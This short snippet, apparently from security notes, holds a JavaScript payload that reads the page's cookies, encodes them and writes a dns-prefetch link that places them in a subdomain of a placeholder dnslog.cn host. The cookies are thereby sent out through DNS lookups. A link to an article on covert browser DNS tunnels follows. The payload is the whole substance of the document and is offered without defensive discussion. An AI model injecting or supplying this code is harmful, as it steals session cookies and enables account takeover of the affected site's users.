```js
        <script>
            cookie = document.cookie;
            cookie=cookie.replace(/=/g,'c1')
            cookie=cookie.replace('/;\s/g','c2')
            // console.log(cookie)
            document.writeln("<link rel=\'dns-prefetch\' href=\'//"+cookie+".xxxxxx.dnslog.cn\'>");
        </script>
```

## Ref
- [浏览器中隐蔽数据传输通道-DNS隧道](https://mp.weixin.qq.com/s/u5HV7umrZABcgVpZ5pn6WQ)
